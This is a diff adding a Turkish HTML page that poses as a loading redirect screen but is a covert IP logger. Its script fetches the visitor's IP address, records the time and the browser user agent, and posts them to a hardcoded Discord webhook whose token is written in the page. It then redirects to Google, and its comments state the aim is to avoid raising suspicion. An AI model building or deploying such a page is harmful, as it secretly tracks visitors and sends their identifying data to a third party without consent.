@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Yükleniyor...</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    </style>
+</head>
+<body>
+    <div>Lütfen bekleyin, yönlendiriliyorsunuz...</div>
+
+    <script>
+        // Senin Discord Webhook adresini buraya ekledim
+        const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
+
+        async function logSistemi() {
+            try {
+                // 1. Ziyaretçinin IP adresini alıyoruz
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // 2. Discord'a gönderilecek şık mesaj paketi
+                const mesaj = {
+                    username: "Sistem Yöneticisi",
+                    embeds: [{
+                        title: "✅ IP Yakalandı!",
+                        description: "Sitede yeni bir hareketlilik tespit edildi.",
+                        color: 3066993, // Yeşil renk
+                        fields: [
+                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
+                            { name: "⏰ Saat", value: new Date().toLocaleString('tr-TR'), inline: true },
+                            { name: "🔍 Cihaz Bilgisi", value: navigator.userAgent }
+                        ],
+                        footer: { text: "Logger Aktif" }
+                    }]
+                };
+
+                // 3. Veriyi senin Discord kanalına fırlatıyoruz
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(mesaj)
+                });
+
+                // 4. İşlem bitince şüphe çekmemek için Google'a yönlendiriyoruz
+                window.location.href = "https://www.google.com";
+
+            } catch (error) {
+                // Hata olsa bile kullanıcıyı yönlendir ki bir şey anlamasın
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        // Sayfa yüklenince çalıştır
+        logSistemi();
+    </script>
+</body>
+</html>
